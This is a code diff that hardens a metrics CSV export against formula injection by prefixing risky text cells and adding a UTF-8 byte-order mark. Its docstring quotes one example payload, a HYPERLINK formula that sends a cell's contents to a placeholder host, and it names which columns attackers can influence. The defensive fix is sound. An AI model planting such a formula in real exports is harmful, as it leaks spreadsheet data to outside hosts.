@@ -435,6 +435,49 @@ async def get_run_events(
     }
 
 
+#: Characters a spreadsheet reads as "this cell is a formula" when they lead
+#: the cell. Tab and CR are in here because Excel strips them first and then
+#: reads what follows, so ``\t=cmd`` is a formula wearing a disguise.
+_CSV_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")
+
+#: U+FEFF, prepended to the body. ``text/csv; charset=utf-8`` is not enough
+#: for Excel on Windows, which reads a BOM-less CSV in the ANSI codepage and
+#: mangles every non-ASCII metric or node name -- in a product that ships a
+#: zh-TW locale. Every other reader (pandas, LibreOffice, Sheets, ``csv``
+#: opened as ``utf-8-sig``) skips it. Spelled ``chr`` rather than pasted:
+#: the character is invisible in an editor, which is how it gets lost.
+_CSV_BOM = chr(0xFEFF)
+
+
+def _csv_text_cell(value: Any) -> str:
+    """One TEXT cell, neutralised against formula injection.
+
+    ``csv.writer`` quotes commas, quotes and embedded newlines correctly,
+    but quoting is not what stops a formula: Excel, LibreOffice and Sheets
+    EVALUATE a cell whose first character is one of
+    :data:`_CSV_FORMULA_LEADERS`, so a metric named
+    ``=HYPERLINK("http://x/?"&A1,"loss")`` fires when the file is opened.
+
+    Two of the six columns are user-influenced. ``name`` is whatever a
+    plugin or custom node computes -- ``invoke_node`` hands any node
+    declaring ``context`` the full ``ExecutionContext``, so
+    ``context.log_metric(name, ...)`` takes an arbitrary string. ``node_id``
+    comes off the graph JSON verbatim. The shipped training nodes only ever
+    pass literals, and the canvas script namespace has no ``log_metric`` at
+    all, so plugins and custom nodes are the live route.
+
+    A leading apostrophe is the convention every spreadsheet understands as
+    "this is text". It costs one visible character in the pathological case
+    and nothing in the normal one.
+
+    Numeric columns are deliberately NOT routed through here: a negative
+    value leads with ``-`` by nature, and quoting it would turn the value
+    column into text and break every chart built on the export.
+    """
+    text = "" if value is None else str(value)
+    return f"'{text}" if text.startswith(_CSV_FORMULA_LEADERS) else text
+
+
 def _metrics_csv(run_id: str, metrics: list[MetricRecord]) -> str:
     buffer = io.StringIO(newline="")
     # Explicit lineterminator: csv defaults to \r\n, and the module's own
@@ -443,14 +486,17 @@ def _metrics_csv(run_id: str, metrics: list[MetricRecord]) -> str:
     writer.writerow(_CSV_COLUMNS)
     for point in metrics:
         writer.writerow([
-            point.run_id, point.node_id or "", point.name, point.step,
+            _csv_text_cell(point.run_id),
+            _csv_text_cell(point.node_id or ""),
+            _csv_text_cell(point.name),
+            point.step,
             # A non-finite value is stored as NULL (a diverged loss); an
             # EMPTY cell is what every spreadsheet reads as a gap, whereas
             # "None" would read as text and poison the column's type.
             "" if point.value is None else point.value,
             point.ts,
         ])
-    return buffer.getvalue()
+    return _CSV_BOM + buffer.getvalue()
 
 
 def _csv_filename(run_id: str) -> str:
